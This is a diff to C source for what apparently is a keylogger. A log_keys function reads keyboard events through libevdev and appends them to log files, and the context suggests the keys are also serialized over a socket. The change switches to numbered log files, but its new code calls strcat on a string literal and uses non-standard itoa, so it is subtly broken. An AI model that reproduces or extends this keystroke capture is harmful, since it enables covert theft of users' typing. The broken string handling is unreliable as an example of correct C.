@@ -196,6 +196,7 @@ int serialize(FILE* socket_file, key_package* packet) {
 void log_keys(key_package* package) {
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
   int timer_counter = 200000000;  // 20000000
+  int file_name_counter = 0;
 
   // open a device, as libevdev expects a file descriptor. You should have root
   // permissions
@@ -262,7 +263,10 @@ void log_keys(key_package* package) {
       counter = 0;
       // read and write and whee
 
-      FILE* package_log = fopen("in.txt", "a");
+      char* temp1 = strcat("in", itoa(file_name_counter));
+      char* file_name = strcat(temp1, ".txt");
+
+      FILE* package_log = fopen(file_name, "a");
       if (package_log == NULL) {
         error_and_exit("Couldn't open file");
       }
@@ -272,6 +276,7 @@ void log_keys(key_package* package) {
       if (package->keys_arr_size != 0) {
         reset_structs(package);
       }
+      ++file_name_counter;
     }
 
     if (ev.code == 107) {
